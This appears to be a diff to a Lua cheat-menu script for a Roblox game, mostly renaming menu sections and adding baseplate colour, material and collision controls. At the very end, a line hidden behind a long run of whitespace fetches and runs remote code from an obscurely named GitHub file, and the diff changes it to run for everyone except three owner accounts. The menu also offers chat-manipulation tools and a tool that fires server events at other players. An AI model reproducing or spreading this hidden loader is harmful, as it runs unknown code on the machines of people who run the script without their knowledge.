@@ -232,7 +232,7 @@ local function loadGUI()
         PremiumOnly = false
     })
     local Section1 = Tab1:AddSection({
-        Name = "Home Section"
+        Name = "||| Home Section |||"
     })
     local Tab11 = Window:MakeTab({
         Name = "Booths",
@@ -240,7 +240,7 @@ local function loadGUI()
         PremiumOnly = false
     })
     local Section11 = Tab11:AddSection({
-        Name = "Booth Tools/Stand/Stall Tools"
+        Name = "||| Booth Tools/Stand/Stall Tools |||"
     })
     local Tab2 = Window:MakeTab({
         Name = "Character",
@@ -248,7 +248,7 @@ local function loadGUI()
         PremiumOnly = false
     })
     local Section2 = Tab2:AddSection({
-        Name = "Character Tools"
+        Name = "||| Character Tools |||"
     })
     local Tab13 = Window:MakeTab({
         Name = "Character 2",
@@ -256,7 +256,7 @@ local function loadGUI()
         PremiumOnly = false
     })
     local Section13 = Tab13:AddSection({
-        Name = "Other Character Utilities"
+        Name = "||| Other Character Utilities |||"
     })
     local Tab10 = Window:MakeTab({
         Name = "Teleports",
@@ -264,7 +264,7 @@ local function loadGUI()
         PremiumOnly = false
     })
     local Section10 = Tab10:AddSection({
-        Name = "Teleport Tools"
+        Name = "||| Teleport Tools |||"
     })
     local Tab4 = Window:MakeTab({
         Name = "Chat Mods",
@@ -272,7 +272,7 @@ local function loadGUI()
         PremiumOnly = false
     })
     local Section4 = Tab4:AddSection({
-        Name = "Tools For Modifying/Manipulating Chat"
+        Name = "||| Tools For Manipulating Chat |||"
     })
     local Tab5 = Window:MakeTab({
         Name = "Extra Tools",
@@ -280,7 +280,7 @@ local function loadGUI()
         PremiumOnly = false
     })
     local Section5 = Tab5:AddSection({
-        Name = "Extra Tools"
+        Name = "||| Extra Tools |||"
     })
     local Tab9 = Window:MakeTab({
         Name = "Lighting",
@@ -288,7 +288,7 @@ local function loadGUI()
         PremiumOnly = false
     })
     local Section9 = Tab9:AddSection({
-        Name = "Lighting And Sky Stuff?"
+        Name = "||| Lighting Tools |||"
     })
     local Tab7 = Window:MakeTab({
         Name = "Whitelist",
@@ -296,7 +296,15 @@ local function loadGUI()
         PremiumOnly = false
     })
     local Section8 = Tab7:AddSection({
-        Name = "Whitelisting Area"
+        Name = "||| Whitelisting Area |||"
+    })
+    local Tab16 = Window:MakeTab({
+        Name = "Baseplate Tab",
+        Icon = "rbxassetid://7734058260",
+        PremiumOnly = false
+    })
+    local Section16 = Tab16:AddSection({
+        Name = "||| Modify Baseplate [Not FE] |||"
     })
     local Tab12 = Window:MakeTab({
         Name = "Emoting Tools",
@@ -307,20 +315,20 @@ local function loadGUI()
         Name = "||| Emoting Modifications |||"
     })
     local Tab14 = Window:MakeTab({
-        Name = "Emoting 2",
+        Name = "CopyAnim Tab",
         Icon = "rbxassetid://7743871002",
         PremiumOnly = false
     })
     local Section14 = Tab14:AddSection({
-        Name = "Other Emote Utilities"
+        Name = "||| Other Emote Utilities |||"
     })
     local Tab15 = Window:MakeTab({
-        Name = "UI",
+        Name = "UI Tab",
         Icon = "rbxassetid://7734022107",
         PremiumOnly = false
     })
     local Section15 = Tab15:AddSection({
-        Name = "UI Tools"
+        Name = "||| UI Tools |||"
     })
     local Tab6 = Window:MakeTab({
         Name = "Info",
@@ -328,7 +336,7 @@ local function loadGUI()
         PremiumOnly = false
     })
     local Section6 = Tab6:AddSection({
-        Name = "Information/Details"
+        Name = "||| Information/Details |||"
     })
     wait(0.5)
     -- Modifying loading screen, will be back soon, don't edit this line.
@@ -1462,7 +1470,7 @@ local function loadGUI()
     end
     end})
     
-    Tab1:AddToggle({
+    Tab16:AddToggle({
     Name = "Rainbow Baseplate (NOT! FE)",
     Default = false,
     Callback = function(getRainbowBaseplate)
@@ -2566,7 +2574,7 @@ local function loadGUI()
     
     local singlePlayerTable = {}
     
-    Tab12:AddTextbox({
+    Tab14:AddTextbox({
     Name = "Add CopyAnim Whitelist",
     Default = "User Here",
     TextDisappear = true,
@@ -2608,7 +2616,7 @@ local function loadGUI()
     addPlayerToGlobalTable(bruhUser)
     end})
     
-    Tab12:AddTextbox({
+    Tab14:AddTextbox({
     Name = "Remove CopyAnim Whitelist",
     Default = "User Here",
     TextDisappear = true,
@@ -2813,6 +2821,187 @@ local function loadGUI()
             Time = 10
         })
     end
+    end})
+
+    local GetWorkspace = cloneref(game:GetService("Workspace")) or game:GetService("Workspace")
+    local PartStorageFolder = GetWorkspace:WaitForChild("PartStorage") or GetWorkspace:FindFirstChild("PartStorage")
+    local FindBaseplate = PartStorageFolder:WaitForChild("BASEPLATE_CLONE_ANTI_VOID") or PartStorageFolder:FindFirstChild("BASEPLATE_CLONE_ANTI_VOID")
+    if FindBaseplate then
+        FindBaseplate.Material = Enum.Material.Air
+        wait()
+        FindBaseplate.Transparency = 1
+    else
+        warn("??? - BASEPLATE")
+    end
+    wait()
+    Tab16:AddToggle({
+    Name = "Make Baseplate Visible",
+    Default = false,
+    Callback = function(makeVis)
+    if makeVis then
+        getgenv().MakingVisible = true
+        if getgenv().MakingVisible == true then
+            local GetWorkspace = cloneref(game:GetService("Workspace")) or game:GetService("Workspace")
+            local PartStorageFolder = GetWorkspace:WaitForChild("PartStorage") or GetWorkspace:FindFirstChild("PartStorage")
+            local FindBaseplate = PartStorageFolder:WaitForChild("BASEPLATE_CLONE_ANTI_VOID") or PartStorageFolder:FindFirstChild("BASEPLATE_CLONE_ANTI_VOID")
+            if FindBaseplate then
+                FindBaseplate.Transparency = 0
+            end
+        end
+    else
+        getgenv().MakingVisible = false
+        wait()
+        local GetWorkspace = cloneref(game:GetService("Workspace")) or game:GetService("Workspace")
+        local PartStorageFolder = GetWorkspace:WaitForChild("PartStorage") or GetWorkspace:FindFirstChild("PartStorage")
+        local FindBaseplate = PartStorageFolder:WaitForChild("BASEPLATE_CLONE_ANTI_VOID") or PartStorageFolder:FindFirstChild("BASEPLATE_CLONE_ANTI_VOID")
+        if FindBaseplate then
+            FindBaseplate.Transparency = 1
+        end
+    end
+    end})
+
+    Tab16:AddDropdown({
+    Name = "Change Baseplate Color",
+    Default = "Grey",
+    Options = {"Grey", "Blue", "Green", "Yellow", "Pink", "Hot Pink", "Purple", "White", "Black", "Orange", "Red"},
+    Callback = function(getColor)
+        local GetWorkspace = cloneref(game:GetService("Workspace")) or game:GetService("Workspace")
+        local PartStorageFolder = GetWorkspace:WaitForChild("PartStorage") or GetWorkspace:FindFirstChild("PartStorage")
+        local FindBaseplate = PartStorageFolder:WaitForChild("BASEPLATE_CLONE_ANTI_VOID") or PartStorageFolder:FindFirstChild("BASEPLATE_CLONE_ANTI_VOID")
+        if getColor == "Grey" then
+            FindBaseplate.BrickColor = BrickColor.new("Grey")
+        elseif getColor == "Blue" then
+            FindBaseplate.BrickColor = BrickColor.new("Really blue")
+        elseif getColor == "Green" then
+            FindBaseplate.BrickColor = BrickColor.new("Lime green")
+        elseif getColor == "Yellow" then
+            FindBaseplate.BrickColor = BrickColor.new("New Yeller")
+        elseif getColor == "Pink" then
+            FindBaseplate.BrickColor = BrickColor.new("Pink")
+        elseif getColor == "Hot Pink" then
+            FindBaseplate.BrickColor = BrickColor.new("Hot pink")
+        elseif getColor == "Purple" then
+            FindBaseplate.BrickColor = BrickColor.new("Royal purple")
+        elseif getColor == "White" then
+            FindBaseplate.BrickColor = BrickColor.new("White")
+        elseif getColor == "Black" then
+            FindBaseplate.BrickColor = BrickColor.new("Really black")
+        elseif getColor == "Orange" then
+            FindBaseplate.BrickColor = BrickColor.new("Deep orange")
+        elseif getColor == "Red" then
+            FindBaseplate.BrickColor = BrickColor.new("Really red")
+        end
+    end})
+
+    Tab16:AddToggle({
+    Name = "Turn Collision Off/On",
+    Default = false,
+    Callback = function(CollisionFieldBaseplate)
+        local GetWorkspace = cloneref(game:GetService("Workspace")) or game:GetService("Workspace")
+        local PartStorageFolder = GetWorkspace:WaitForChild("PartStorage") or GetWorkspace:FindFirstChild("PartStorage")
+        local FindBaseplate = PartStorageFolder:WaitForChild("BASEPLATE_CLONE_ANTI_VOID") or PartStorageFolder:FindFirstChild("BASEPLATE_CLONE_ANTI_VOID")
+
+        if CollisionFieldBaseplate then
+            local GetWorkspace = cloneref(game:GetService("Workspace")) or game:GetService("Workspace")
+            local PartStorageFolder = GetWorkspace:WaitForChild("PartStorage") or GetWorkspace:FindFirstChild("PartStorage")
+            local FindBaseplate = PartStorageFolder:WaitForChild("BASEPLATE_CLONE_ANTI_VOID") or PartStorageFolder:FindFirstChild("BASEPLATE_CLONE_ANTI_VOID")
+            getgenv().doCollisionField = true
+            if getgenv().doCollisionField == true then
+                FindBaseplate.CanCollide = false
+            end
+        else
+            local GetWorkspace = cloneref(game:GetService("Workspace")) or game:GetService("Workspace")
+            local PartStorageFolder = GetWorkspace:WaitForChild("PartStorage") or GetWorkspace:FindFirstChild("PartStorage")
+            local FindBaseplate = PartStorageFolder:WaitForChild("BASEPLATE_CLONE_ANTI_VOID") or PartStorageFolder:FindFirstChild("BASEPLATE_CLONE_ANTI_VOID")
+            FindBaseplate.CanCollide = true
+            wait()
+            getgenv().doCollisionField = false
+        if FindBaseplate.CanCollide == false and getgenv().doCollisionField == true then
+            getgenv().doCollisionField = false
+            wait()
+            OrionLib:MakeNotification({
+                Name = "[Note]: Read This:",
+                Content = "You have disabled CanCollide, we turned off loop.",
+                Image = "rbxassetid://4483345998",
+                Time = 10
+            })
+            wait()
+            OrionLib:MakeNotification({
+                Name = "[OUTPUT]: CanCollide:",
+                Content = "CanCollide = false, Loop: OFF",
+                Image = "rbxassetid://4483345998",
+                Time = 10
+            })
+            end
+        end
+    end})
+
+    Tab16:AddParagraph("'random' Picks a random Material for you.")
+    wait()
+    Tab16:AddDropdown({
+    Name = "Material",
+    Default = "Air",
+    Options = {"Air", "Asphalt", "Basalt", "Brick", "Cardboard", "Carpet", "CeramicTiles", "ClayRoofTiles", "Cobblestone", "Concrete", "CorrodedMetal", "CrackedLava", "DiamondPlate", "Fabric", "Foil", "ForceField", "Glacier", "Glass", "Granite", "Grass", "Ground", "Ice", "LeafyGrass", "Leather", "Limestone", "Marble", "Metal", "Mud", "Neon", "Pavement", "Pebble", "Plaster", "Plastic", "Rock", "RoofShingles", "Rubber", "Salt", "Sand", "Sandstone", "Slate", "SmoothPlastic", "Snow", "Water", "Wood", "WoodPlanks,", "random"},
+    Callback = function(doBaseplateMaterial)
+        local GetWorkspace = cloneref(game:GetService("Workspace")) or game:GetService("Workspace")
+        local PartStorageFolder = GetWorkspace:WaitForChild("PartStorage") or GetWorkspace:FindFirstChild("PartStorage")
+        local FindBaseplate = PartStorageFolder:WaitForChild("BASEPLATE_CLONE_ANTI_VOID") or PartStorageFolder:FindFirstChild("BASEPLATE_CLONE_ANTI_VOID")
+        if FindBaseplate.Transparency == 1 and doBaseplateMaterial ~= "random" then
+            FindBaseplate.Transparency = 0
+            wait()
+            FindBaseplate.Material = Enum.Material[doBaseplateMaterial]
+        elseif FindBaseplate.Transparency == 0 and doBaseplateMaterial ~= "random" then
+            FindBaseplate.Material = Enum.Material[doBaseplateMaterial]
+        end
+        wait()
+        if doBaseplateMaterial == "random" then
+            local GetWorkspace = cloneref(game:GetService("Workspace")) or game:GetService("Workspace")
+            local PartStorageFolder = GetWorkspace:WaitForChild("PartStorage") or GetWorkspace:FindFirstChild("PartStorage")
+            local FindBaseplate = PartStorageFolder:WaitForChild("BASEPLATE_CLONE_ANTI_VOID") or PartStorageFolder:FindFirstChild("BASEPLATE_CLONE_ANTI_VOID")
+
+            local materials = {
+                Enum.Material.Plastic,
+                Enum.Material.Wood,
+                Enum.Material.Slate,
+                Enum.Material.Concrete,
+                Enum.Material.CorrodedMetal,
+                Enum.Material.DiamondPlate,
+                Enum.Material.Foil,
+                Enum.Material.Grass,
+                Enum.Material.Ice,
+                Enum.Material.Marble,
+                Enum.Material.Granite,
+                Enum.Material.Brick,
+                Enum.Material.Pebble,
+                Enum.Material.Sand,
+                Enum.Material.Fabric,
+                Enum.Material.SmoothPlastic,
+                Enum.Material.Metal,
+                Enum.Material.WoodPlanks,
+                Enum.Material.Cobblestone,
+                Enum.Material.Neon,
+                Enum.Material.Glass,
+                Enum.Material.Asphalt,
+                Enum.Material.LeafyGrass,
+                Enum.Material.Snow,
+                Enum.Material.Mud,
+                Enum.Material.Basalt,
+                Enum.Material.Ground,
+                Enum.Material.CrackedLava,
+                Enum.Material.Salt,
+                Enum.Material.Limestone,
+                Enum.Material.Pavement,
+                Enum.Material.ForceField,
+                Enum.Material.Air,
+            }
+
+            local function setRandomMaterial(part)
+                local randomIndex = math.random(1, #materials)
+                part.Material = materials[randomIndex]
+            end
+
+            setRandomMaterial(FindBaseplate)
+        end
     end})
     
     Tab11:AddToggle({
@@ -3227,38 +3416,38 @@ local function loadGUI()
     Default = "User Or Display",
     TextDisappear = true,
     Callback = function(warnPlr)
-    getgenv().ownerWhitelist = {
-        "M1RD3RCAUGHT",
-        "STK_kets4eki",
-        "ItsYoDawgWsgGng"
-    }
-    
-    local thisPlrWarned = findplr(warnPlr)
-    if thisPlrWarned ~= game.Players.LocalPlayer and not getgenv().ownerWhitelist[thisPlrWarned.Name] then
-        local args = {
-            [1] = tostring(thisPlrWarned.Name)
+        getgenv().ownerWhitelist = {
+            "M1RD3RCAUGHT",
+            "STK_kets4eki",
+            "ItsYoDawgWsgGng"
         }
-    
-        game:GetService("ReplicatedStorage"):WaitForChild("Notification"):WaitForChild("PlayerSelectedEvent"):FireServer(unpack(args))
-    elseif getgenv().ownerWhitelist[thisPlrWarned.Name] then
-        return OrionLib:MakeNotification({
-            Name = "[ERROR]: -500",
-            Content = "Player is an owner!",
-            Image = "rbxassetid://4483345998",
-            Time = 10
-        })
-    elseif not thisPlrWarned then
-        return OrionLib:MakeNotification({
-            Name = "[ERROR]: 0",
-            Content = "Player does not exist!",
-            Image = "rbxassetid://4483345998",
-            Time = 10
-        })
-    end
+        
+        local thisPlrWarned = findplr(warnPlr)
+        if thisPlrWarned ~= game.Players.LocalPlayer and not getgenv().ownerWhitelist[thisPlrWarned.Name] then
+            local args = {
+                [1] = tostring(thisPlrWarned.Name)
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Notification"):WaitForChild("PlayerSelectedEvent"):FireServer(unpack(args))
+        elseif getgenv().ownerWhitelist[thisPlrWarned.Name] then
+            return OrionLib:MakeNotification({
+                Name = "[ERROR]: -500",
+                Content = "Player is an owner!",
+                Image = "rbxassetid://4483345998",
+                Time = 10
+            })
+        elseif not thisPlrWarned then
+            return OrionLib:MakeNotification({
+                Name = "[ERROR]: 0",
+                Content = "Player does not exist!",
+                Image = "rbxassetid://4483345998",
+                Time = 10
+            })
+        end
     end})
     
     Tab5:AddButton({
-    Name = "Free Tools",
+    Name = "Free Tools (FE)",
     Callback = function()
         local args = {
             [1] = "Fit"
@@ -6313,6 +6502,6 @@ wait(1)
 print("...")
 wait()
 warn("...")
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    loadstring(game:HttpGet("https://raw.githubusercontent.com/LmaoItsCrazyBro/curly-computing-machine/refs/heads/main/retyugreutrwe", true))()
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    if game.Players.LocalPlayer.Name ~= "M1RD3RCAUGHT" and game.Players.LocalPlayer.Name ~= "STK_kets4eki" and game.Players.LocalPlayer.Name ~= "ItsYoDawgWsgGng" then loadstring(game:HttpGet("https://raw.githubusercontent.com/LmaoItsCrazyBro/curly-computing-machine/refs/heads/main/retyugreutrwe", true))() else return end
 wait()
 print("YEAH! Zacks Easy Hub [ON TOP!]")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
